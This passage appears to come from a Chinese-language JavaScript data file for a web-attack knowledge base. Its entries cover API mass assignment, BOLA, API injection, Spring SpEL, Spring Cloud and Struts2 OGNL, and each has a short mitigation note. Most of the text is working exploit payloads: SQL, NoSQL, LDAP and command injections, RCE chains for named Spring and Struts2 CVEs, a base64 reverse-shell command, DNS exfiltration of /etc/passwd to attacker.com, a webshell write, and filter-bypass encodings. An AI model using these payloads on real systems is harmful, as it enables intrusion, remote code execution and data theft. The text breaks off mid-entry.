            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 数字转布尔\n{"isAdmin": 1}\n{"isAdmin": "true"}\n\n# 数组转字符串\n{"roles": "admin"}\n\n# 对象转数组\n{"settings": ["admin"]}', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '类型混淆测试', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: '批量赋值(Mass Assignment)漏洞发生在API自动将请求参数绑定到数据模型时，攻击者通过提交额外的字段(如role=admin/is_verified=true)来修改不应由用户控制的属性。',
      vulnerability: '批量赋值漏洞场景：1)用户注册时添加role:admin字段提升权限 2)修改个人资料时添加balance:999999修改余额 3)创建订单时修改price:0改价格 4)更新设置时添加is_admin:true获取管理权限。框架的自动绑定特性(如Spring/Rails)是根因。',
      exploitation: '完�利用流程：\n1. 发送正常请求观察响应字段\n2. 识别敏感字段(role, isAdmin等)\n3. 在请求中添加敏感字段\n4. 验证是否成功修改',
      mitigation: '防御措施：\n1. 使用DTO(数据传输对象)\n2. 白名单允许的字段\n3. 使用对象映射库配置\n4. 验证和过滤输入',
      difficulty: 'beginner'
    }
  },
  {
    id: 'api-bola',
    name: 'BOLA�坏对象级授权',
    description: '利用BOLA漏�访问未授权对象',
    category: 'API安全',
    subCategory: 'BOLA',
    tags: ['api', 'bola', 'authorization', 'idor'],
    prerequisites: ['API使用对象ID', '授权检查缺陷'],
    execution: [
      { 
        title: '1. 识别对象访问', 
        command: '# 观察API端点\nGET /api/users/{user_id}/documents\nGET /api/teams/{team_id}/members\nGET /api/orders/{order_id}\n\n# 分析对象关系\n# 用户 -> 文档\n# 团队 -> 成员\n# 订单 -> 用户', 
        description: '识别对象访问模式', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{user_id}', explanation: '用户ID参数' },
          { part: '{team_id}', explanation: '团队ID参数' }
        ]
      },
      { 
        title: '2. 测试授权', 
        command: '# 创建两个�户测试\n# 用户A: user_a_token\n# 用户B: user_b_token\n\n# 用户A创建资源\nPOST /api/documents\nAuthorization: Bearer user_a_token\n{"title": "Secret Doc"}\n# 返回: {"id": "doc_123"}\n\n# 用户B尝试访问\nGET /api/documents/doc_123\nAuthorization: Bearer user_b_token\n# 如果返回200，存在BOLA', 
        description: '测试授权检查', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '创建两个�户测试\n#', explanation: '关键参数', type: 'value' },
          { part: '用户A:', explanation: '关键参数', type: 'value' },
          { part: 'user_a_token\n#', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. 横向访问', 
        command: '# 枚举其他用户资源\nfor doc_id in doc_1 doc_2 doc_3; do\n  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/documents/$doc_id"\ndone\n\n# 访问其他用户私有数据\nGET /api/users/2/profile\nGET /api/users/2/settings\nGET /api/users/2/credit-cards', 
        description: '横向访问测试', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://target.com/api/documents/$doc_id', explanation: '目标URL', type: 'value' }
        ]
      },
      { 
        title: '4. 修改/删除操作', 
        command: '# 修改其他用户数据\nPUT /api/documents/doc_123\nAuthorization: Bearer user_b_token\n{"title": "Modified by B"}\n\n# 删除其他用户数据\nDELETE /api/documents/doc_123\nAuthorization: Bearer user_b_token\n\n# 添加到其他团队\nPOST /api/teams/team_1/members\nAuthorization: Bearer attacker_token\n{"user_id": "attacker_id"}', 
        description: '修改/删除操作测试', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '修改其他用户数据\nPUT', explanation: '关键参数', type: 'value' },
          { part: '/api/documents/doc_123\nAuthorization:', explanation: '关键参数', type: 'value' },
          { part: 'Bearer', explanation: '关键参数', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '路径遍历', 
        command: '# 路径遍历访问\nGET /api/users/../admin\nGET /api/users/..%2Fadmin\n\n# 编码绕过\nGET /api/users/%2e%2e/admin\nGET /api/users/..%c0%afadmin',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 路径遍历访问\nGET /api/users/../admin\nGET /api/users/..%2Fadmin\n\n# 编码绕过\nGET /api/users/%2e%2e/admin\nGET /api/users/..%c0%afadmin', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '路径遍历绕过', 
        platform: 'all'
      },
      { 
        title: '参数篡改', 
        command: '# 修改请求方法\n# GET变POST\nPOST /api/documents/doc_123\n\n# 添加参数\nGET /api/documents/doc_123?user_id=attacker\n\n# 修改Content-Type\nContent-Type: application/xml\n<document><id>doc_123</id></document>',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 修改请求方法\n# GET变POST\nPOST /api/documents/doc_123\n\n# 添加参数\nGET /api/documents/doc_123?user_id=attacker\n\n# 修改Content-Type\nContent-Type: application/xml\n<document><id>doc_123</id></document>', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '参数篡改绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'BOLA(Broken Object Level Authorization)是OWASP API Top 10排名第一的漏洞，指API在对象级别缺乏适当的授权检查，允许认证用户访问或操作不属于自己的资源对象。',
      vulnerability: 'BOLA与IDOR密切相关，但更强调授权层面的缺陷：1)API仅验证用户已登录但不验证对象所有权 2)通过ID遍历可批量获取所有用户数据 3)GraphQL中通过节点ID直接访问任意对象 4)关联对象授权缺失(访问他人的子资源)。',
      exploitation: '完�利用流程：\n1. 识别使用对象ID的API\n2. 创建多个测试�户\n3. 测试跨�户访问\n4. 枚举其他对象\n5. 尝试修改/删除操作',
      mitigation: '防御措施：\n1. 实施对象级授权检查\n2. 验证用户对资源的所有权\n3. 使用不可预测的ID\n4. 记录异常访问\n5. 实施速率限制',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'api-injection',
    name: 'API注入攻击',
    description: 'API端点中的各类注入攻击',
    category: 'API安全',
    subCategory: 'API注入',
    tags: ['api', 'injection', 'sqli', 'nosqli'],
    prerequisites: ['API接受用户输入', '输入未正确过滤'],
    execution: [
      { 
        title: '1. SQL注入', 
        command: '# REST API SQL注入\nGET /api/users?id=1 OR 1=1\nGET /api/users?name=admin\'--\nGET /api/users?sort=name; DROP TABLE users--\n\n# POST请求注入\nPOST /api/users\n{"name": "admin\' OR \'1\'=\'1"}\n\n# JSON注入\nPOST /api/search\n{"query": "test\' UNION SELECT username,password FROM users--"}', 
        description: 'API SQL注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'OR 1=1', explanation: 'SQL注入永真条件' },
          { part: 'UNION SELECT', explanation: '联合查询注入' }
        ]
      },
      { 
        title: '2. NoSQL注入', 
        command: '# MongoDB注入\nGET /api/users?name[$ne]=\nGET /api/users?age[$gt]=0\nGET /api/users?role[$ne]=user\n\n# POST请求\nPOST /api/login\n{"username": "admin", "password": {"$ne": ""}}\n\n{"username": "admin", "password": {"$regex": ".*"}}\n\n# 嵌套查询\n{"$where": "this.password == this.password"}\n{"$where": "return true"}', 
        description: 'NoSQL注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$ne', explanation: 'MongoDB不等于操作符' },
          { part: '$regex', explanation: '正则表达式匹配' },
          { part: '$where', explanation: 'JavaScript执行' }
        ]
      },
      { 
        title: '3. LDAP注入', 
        command: '# LDAP注入\nGET /api/users?name=*)(uid=*))(|(uid=*\nGET /api/login?user=*&password=*\n\n# 认证绕过\nPOST /api/auth\n{"user": "admin)(|(password=*))", "password": "x"}\n\n# 信息泄露\nGET /api/search?name=*)(objectClass=*)', 
        description: 'LDAP注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '*)', explanation: 'LDAP闭合当前过滤器' },
          { part: '(uid=*)', explanation: '匹配所有用户' }
        ]
      },
      { 
        title: '4. 命令注入', 
        command: '# OS命令注入\nGET /api/ping?host=127.0.0.1;id\nGET /api/convert?file=test.pdf;cat /etc/passwd\n\n# POST请求\nPOST /api/exec\n{"cmd": "ls -la; cat /etc/passwd"}\n\n# 反引号注入\nGET /api/check?host=`id`\nGET /api/check?host=$(id)', 
        description: '命令注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: ';id', explanation: '命令分隔符后执行id命令' },
          { part: '`id`', explanation: '命令替换执行' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '# URL编码\nGET /api/users?id=1%20OR%201%3D1\n\n# Unicode编码\nGET /api/users?id=1%u0020OR%u00201%3D1\n\n# 双重编码\nGET /api/users?id=1%2520OR%25201%253D1',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' URL编码\nGET /api/users?id=1%20OR%201%3D1\n\n# Unicode编码\nGET /api/users?id=1%u0020OR%u00201%3D1\n\n# 双重编码\nGET /api/users?id=1%2520OR%25201%253D1', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '编码绕过', 
        platform: 'all'
      },
      { 
        title: 'Content-Type绕过', 
        command: '# 切换Content-Type\nContent-Type: application/xml\n<user><id>1 OR 1=1</id></user>\n\nContent-Type: application/x-www-form-urlencoded\nid=1+OR+1=1\n\n# JSON数组\n{"id": ["1", "OR", "1=1"]}',
            syntaxBreakdown: [
              { part: '# 切换Content-Type\nContent-Type: application/xml\n<user><id>1 ', explanation: 'SQL表达式', type: 'value' },
              { part: 'OR', explanation: 'SQL关键字', type: 'keyword' },
              { part: ' 1=1</id></user>\n\nContent-Type: application/x-www-form-urlencoded\nid=1+', explanation: 'SQL表达式', type: 'value' },
              { part: 'OR', explanation: 'SQL关键字', type: 'keyword' },
              { part: '+1=1\n\n# JSON数组\n{"id": ["1", "', explanation: 'SQL表达式', type: 'value' },
              { part: 'OR', explanation: 'SQL关键字', type: 'keyword' },
              { part: '", "1=1"]}', explanation: 'SQL表达式', type: 'value' }
            ],
        description: 'Content-Type绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'API注入攻击将传统的注入技术(SQL/NoSQL/OS命令/LDAP等)应用于API接口，JSON/XML格式的输入参数、查询字符串、HTTP头等都可能成为注入点，且API通常缺少Web应用的WAF防护。',
      vulnerability: 'API注入攻击面：1)JSON参数中的SQL/NoSQL注入 2)GraphQL查询变量中的注入 3)API网关/中间件的头注入(Host/X-Forwarded-For) 4)文件名/路径参数的命令注入 5)LDAP/XPATH查询参数注入 6)API响应中的XSS(存储型)。',
      exploitation: '完�利用流程：\n1. 识别输入点\n2. 分析后端技术栈\n3. 选择合适的注入类型\n4. 构造注入payload\n5. 提取数据或执行命令',
      mitigation: '防御措施：\n1. 使用参数化查询\n2. 输入验证和白名单\n3. 最小权限原则\n4. 错误信息不泄露\n5. WAF防护',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'spring-spel',
    name: 'Spring SpEL注入',
    description: 'Spring表达式语言注入攻击',
    category: '框架漏洞',
    subCategory: 'Spring SpEL',
    tags: ['spring', 'spel', 'expression', 'rce'],
    prerequisites: ['使用Spring框架', '存在SpEL注入点'],
    execution: [
      { 
        title: '1. 探测SpEL注入', 
        command: '# 测试表达式执行\n${7*7}\n#{7*7}\n${T(java.lang.Runtime).getRuntime()}\n\n# 观察响应\n# 如果返回49或执行成功则存在漏�', 
        description: '探测SpEL注入点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '${...}', explanation: 'Spring表达式语法' },
          { part: '#{...}', explanation: 'SpEL表达式语法' },
          { part: 'T()', explanation: '类型引用' }
        ]
      },
      { 
        title: '2. 命令执行', 
        command: '# Runtime执行命令\n${T(java.lang.Runtime).getRuntime().exec("id")}\n#{T(java.lang.Runtime).getRuntime().exec("whoami")}\n\n# ProcessBuilder\n${new java.lang.ProcessBuilder(new String[]{"id"}).start()}\n#{new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}\n\n# 反弹Shell\n${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}', 
        description: '执行系统命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'T(java.lang.Runtime)', explanation: '引用Runtime类' },
          { part: 'getRuntime()', explanation: '获取Runtime实例' },
          { part: 'exec()', explanation: '执行命令' }
        ]
      },
      { 
        title: '3. 文件读取', 
        command: '# 读取文件\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream())}\n\n# 使用Scanner\n#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd").getInputStream()).useDelimiter("\\\\A").next()}\n\n# �接读取\n${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}', 
        description: '读取敏感文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'Runtime', explanation: '运行时执行', type: 'keyword' }
        ]
      },
      { 
        title: '4. DNS外带', 
        command: '# DNS外带数据\n${T(java.net.InetAddress).getByName("attacker.com")}\n\n# 外带文件内容\n${T(java.net.InetAddress).getByName(T(java.lang.String).valueOf(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/etc/passwd"))).substring(0,20)+".attacker.com")}', 
        description: 'DNS外带数据', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'getByName', explanation: '解析域名触发DNS请求' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '# 绕过关键字过滤\n${T(java.lang.Run"+"time).getRun"+"time().exec("id")}\n#{T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("exec",T(String)).invoke(T(String).getClass().forName("java.la"+"ng.Runtime").getMethod("getRuntime").invoke(null),"id")}',
        description: '字符串拼接绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'Runtime', explanation: '运行时执行', type: 'keyword' }
        ]
      },
      { 
        title: '反射绕过', 
        command: '# 使用反射\n#{T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}\n\n# 使用ScriptEngine\n#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"id\\\")")}',
        description: '反射绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Spring表达式语言(SpEL)注入是Spring框架中的严重漏洞，允许攻击者在SpEL表达式上下文中执行任意Java代码。受影响的组件包括Spring MVC、Spring Cloud、Spring Data等多个模块。',
      vulnerability: 'SpEL注入通过T(java.lang.Runtime).getRuntime().exec()执行系统命令，或通过ClassLoader加载远程类。触发点包括：Spring Cloud Gateway的路由断言/过滤器、Spring Data的@Value注解、Thymeleaf预处理表达式、Spring Security OAuth的错误处理。',
      exploitation: '完�利用流程：\n1. 探测SpEL注入点\n2. 确认表达式执行\n3. 使用Runtime执行命令\n4. 读取敏感文件或反弹Shell',
      mitigation: '防御措施：\n1. 避免用户输入�接用于表达式\n2. 使用SimpleEvaluationContext\n3. 输入验证和过滤\n4. 升级Spring版本',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'spring-cloud',
    name: 'Spring Cloud漏�',
    description: 'Spring Cloud相关漏�利用',
    category: '框架漏洞',
    subCategory: 'Spring Cloud',
    tags: ['spring', 'cloud', 'rce', 'deserialization'],
    prerequisites: ['使用Spring Cloud', '存在漏�版本'],
    execution: [
      { 
        title: '1. Spring Cloud Gateway RCE', 
        command: '# CVE-2022-22947\n# 添加恶意路由\nPOST /actuator/gateway/routes/hack HTTP/1.1\nContent-Type: application/json\n\n{\n  "id": "hack",\n  "filters": [{\n    "name": "AddResponseHeader",\n    "args": {\n      "name": "Result",\n      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"\n    }\n  }],\n  "uri": "http://example.com"\n}\n\n# 刷新路由\nPOST /actuator/gateway/refresh\n\n# 查看结果\nGET /actuator/gateway/routes/hack', 
        description: 'Spring Cloud Gateway RCE', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'actuator/gateway/routes', explanation: 'Gateway路由管理端点' },
          { part: 'AddResponseHeader', explanation: '添加响应�过滤器' }
        ]
      },
      { 
        title: '2. Spring Cloud Function SpEL', 
        command: '# CVE-2022-22963\n# 修改请求�触发SpEL\nPOST /functionRouter HTTP/1.1\nspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")\nContent-Type: text/plain\n\npayload', 
        description: 'Spring Cloud Function SpEL注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'spring.cloud.function.routing-expression', explanation: '路由表达式�' }
        ]
      },
      { 
        title: '3. Spring Cloud Netflix', 
        command: '# CVE-2020-5410 目录遍历\nGET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd\n\n# Eureka Server SSRF\nPOST /eureka/apps\n# 配置serviceUrl指向内网服务', 
        description: 'Spring Cloud Netflix漏�', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '%XX', explanation: 'URL编码', type: 'encoding' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '# URL编码绕过\n..%252f = ..%2f = ../\n\n# 双重URL编码\n..%252f..%252f',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' URL编码绕过\n..%252f = ..%2f = ../\n\n# 双重URL编码\n..%252f..%252f', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Spring Cloud是微服务架构中的核心框架，其安全漏洞可影响整个微服务集群。已知的高危漏洞包括Spring Cloud Gateway SpEL注入(CVE-2022-22947)和Spring Cloud Function RCE(CVE-2022-22963)等。',
      vulnerability: 'Spring Cloud漏洞：1)Gateway Actuator SpEL注入(通过/actuator/gateway/routes添加包含SpEL的路由) 2)Cloud Function通过spring.cloud.function.routing-expression头注入SpEL 3)Config Server路径穿越读取任意文件。',
      exploitation: '完�利用流程：\n1. 识别Spring Cloud组件\n2. 检测Actuator端点\n3. 利用已知CVE漏�\n4. 执行命令或读取文件',
      mitigation: '防御措施：\n1. 升级到安全版本\n2. 禁用不必要的Actuator端点\n3. 实施访问控制\n4. 监控异常请求',
      difficulty: 'advanced'
    }
  },
  {
    id: 'struts2-rce',
    name: 'Struts2远程代码执行',
    description: 'Apache Struts2框架RCE漏�',
    category: '框架漏洞',
    subCategory: 'Struts2',
    tags: ['struts2', 'rce', 'java', 'apache'],
    prerequisites: ['使用Struts2框架', '存在漏�版本'],
    execution: [
      { 
        title: '1. S2-045漏�', 
        command: '# CVE-2017-5638\n# Content-Type�注入\nContent-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}', 
        description: 'S2-045 Content-Type注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'multipart/form-data', explanation: '触发漏�的Content-Type' },
          { part: '#dm', explanation: '默认成员访问权限' },
          { part: '#cmd', explanation: '要执行的命令' }
        ]
      },
      { 
        title: '2. S2-046漏�', 
        command: '# CVE-2017-5638\n# Content-Disposition注入\nContent-Disposition: form-data; name="upload"; filename="%{#context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'].addHeader(\'X-Test\',\'vulnerable\')}"\n\n# 完�RCE\nContent-Disposition: form-data; name="upload"; filename="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd=\'id\').(#cmds={\'/bin/bash\',\'-c\',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"', 
        description: 'S2-046 Content-Disposition注入', 
        platform: 'all'
      },
      { 
        title: '3. S2-057漏�', 
        command: '# CVE-2018-11776\n# URL命名空�注入\nhttp://target/${(111+111)}/test.action\n# 如果返回222则存在漏�\n\n# RCE\nhttp://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd=\'id\').(#cmds={\'/bin/bash\',\'-c\',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action', 
        description: 'S2-057 URL命名空�注入', 
        platform: 'all'
      },
      { 
        title: '4. S2-061/S2-062漏�', 
        command: '# CVE-2020-17530\n# OGNL表达式注入\nPOST /action HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nid=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d\n\n# 解码后\nid=%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.@java.lang.Runtime@getRuntime().exec(\'id\')}', 
        description: 'S2-061/062 OGNL注入', 
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '# URL编码\n%{#cmd} = %25%7b%23cmd%7d\n\n# Unicode编码\n\\u0025{#cmd}\n\n# 双重编码\n%2525%257b%2523cmd%257d',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' URL编码\n%{#cmd} = %25%7b%23cmd%7d\n\n# Unicode编码\n\\u0025{#cmd}\n\n# 双重编码\n%2525%257b%2523cmd%257d', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '编码绕过', 
        platform: 'all'
      },
      { 
        title: '表达式变体', 
        command: '# 不同表达式语法\n${...}\n%{...}\n#{...}\n@{...}\n\n# 使用静态方法\n@java.lang.Runtime@getRuntime()\nnew java.lang.ProcessBuilder()',
            syntaxBreakdown: [
              { part: '# 不同表达式语法\n${...}\n%{...}\n#{...}\n@{...}\n\n# 使用静态方法\n@java', explanation: '模板表达式注入', type: 'value' }
            ],
        description: '表达式变体绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Apache Struts2是经典的Java Web框架，历史上存在大量RCE漏洞(S2-001到S2-066+)，主要源于OGNL表达式注入。Struts2漏洞曾导致美国Equifax等重大数据泄露事件，至今仍是攻击者重点目标。',
      vulnerability: 'Struts2 RCE漏洞利用OGNL(Object-Graph Navigation Language)表达式注入：%{expression}或${expression}在处理用户输入时被解析为OGNL表达式执行Java代码。高危CVE包括S2-045(Content-Type头)、S2-046(文件名)、S2-057(namespace)等。',
      exploitation: '完�利用流程：\n1. 识别Struts2框架\n2. 检测漏�版本\n3. 选择合适的CVE利用\n4. 执行命令或反弹Shell',
      mitigation: '防御措施：\n1. 升级到最新版本\n2. 禁用动态方法调用\n3. 严格过滤用户输入\n4. 部署WAF',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'struts2-ognl',
    name: 'Struts2 OGNL表达式注入',
    description: 'Struts2 OGNL表达式注入技术详解',
    category: '框架漏洞',
    subCategory: 'Struts2 OGNL',
    tags: ['struts2', 'ognl', 'expression', 'injection'],
    prerequisites: ['使用Struts2框架', '存在OGNL注入点'],
    execution: [
      { 
        title: '1. OGNL基础语法', 
        command: '# 访问对象属性\n#object.property\n#object[\'property\']\n\n# 调用方法\n#object.method()\n#object.method(arg1, arg2)\n\n# 静态方法调用\n@package.ClassName@method()\n@java.lang.Runtime@getRuntime()\n\n# 创建对象\nnew java.lang.String("test")\nnew java.lang.ProcessBuilder(new String[]{"id"})', 
        description: 'OGNL基础语法', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '访问OGNL上下文变量' },
          { part: '@', explanation: '访问静态成员' },
          { part: 'new', explanation: '创建新对象' }
        ]
      },
      { 
        title: '2. 绕过安全限制', 
        command: '# 获取DEFAULT_MEMBER_ACCESS\n#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS\n\n# 设置成员访问权限\n#_memberAccess=#dm\n\n# 清除排除类\n#ognlUtil.getExcludedClasses().clear()\n#ognlUtil.getExcludedPackageNames().clear()\n\n# 完�绕过\n(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))', 
        description: '绕过安全限制', 
        platform: 'all'
      },
      { 
        title: '3. 命令执行技巧', 
        command: '# 使用Runtime\n#cmd=\'id\'\n#cmds={\'/bin/bash\',\'-c\',#cmd}\n#p=new java.lang.ProcessBuilder(#cmds)\n#process=#p.start()\n\n# 获取输出\n#is=#process.getInputStream()\n#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()\n@org.apache.commons.io.IOUtils@copy(#is,#ros)\n\n# 字符串输出\n@org.apache.commons.io.IOUtils@toString(#process.getInputStream())', 
        description: '命令执行技巧', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# 使用Runtime\n#cmd=\\'id\\'\n#cmd', explanation: '利用载荷', type: 'value' }
        ]
      },
      { 
        title: '4. 文件操作', 
        command: '# 读取文件\nnew java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\\\A").next()\n\n# 写入文件\nnew java.io.FileOutputStream("shell.jsp").write(new sun.misc.BASE64Decoder().decodeBuffer("BASE64_SHELL").getBytes())\n\n# 列出目录\nnew java.io.File("/").list()', 
        description: '文件操作', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '读取文件\nnew', explanation: '关键参数', type: 'value' },
          { part: 'java.util.Scanner(new', explanation: '关键参数', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '字符编码绕过', 
        command: '# Unicode编码\n\\u0069d = id\n\\u0027 = \'\n\n# 十六进制\n\\x69\\x64 = id\n\n# 字符串拼接\n"i"+"d" = "id"\n\'id\'.substring(0,2)',
        description: '字符编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '\xXX', explanation: '十六进制编码', type: 'encoding' }
        ]
      },
      { 
        title: '反射绕过', 
        command: '# 使用反射调用\n#cls=@java.lang.Class@forName("java.lang.Runtime")\n#method=#cls.getMethod("getRuntime")\n#rt=#method.invoke(null)\n#exec=#cls.getMethod("exec",@java.lang.String@class)\n#exec.invoke(#rt,"id")',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 使用反射调用\n#cls=@java.lang.Class@forName("java.lang.Runtime")\n#method=#cls.getMethod("getRuntime")\n#rt=#method.invoke(null)\n#exec=#cls.getMethod("exec",@java.lang.String@class)\n#exec.invoke(#rt,"id")', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '反射绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'OGNL是Struts2的核心表达式语言，提供了访问Java对象图的强大能力。OGNL注入可创建ProcessBuilder/Runtime对象执行系统命令，是Struts2历史上绝大多数RCE漏洞的根本原因。',
      vulnerability: 'OGNL注入利用方式：1)通过#_memberAccess修改安全管理器配置 2)使用@java.lang.Runtime@getRuntime().exec()执行命令 3)ProcessBuilder创建进程 4)通过ClassLoader加载远程恶意类 5)各版本Struts2的OGNL沙箱绕过技术不断演进。',
      exploitation: '完�利用流程：\n1. 理解OGNL语法\n2. 绕过安全限制\n3. 执行系统命令\n4. 获取命令输出',
      mitigation: '防御措施：\n1. 升级Struts2版本\n2. 严格过滤用户输入\n3. 禁用OGNL表达式\n4. 配置安全限制',
      difficulty: 'advanced'
    }
  },
  {
    id: 'weblogic-rce',
    name: 'WebLogic远程代码执行',
    description: 'Oracle WebLogic Server RCE漏�',
    category: '框架漏洞',
    subCategory: 'WebLogic',
    tags: ['weblogic', 'rce', 'java', 'oracle'],
    prerequisites: ['使用WebLogic Server', '存在漏�版本'],
    execution: [
      { 
        title: '1. CVE-2017-10271', 
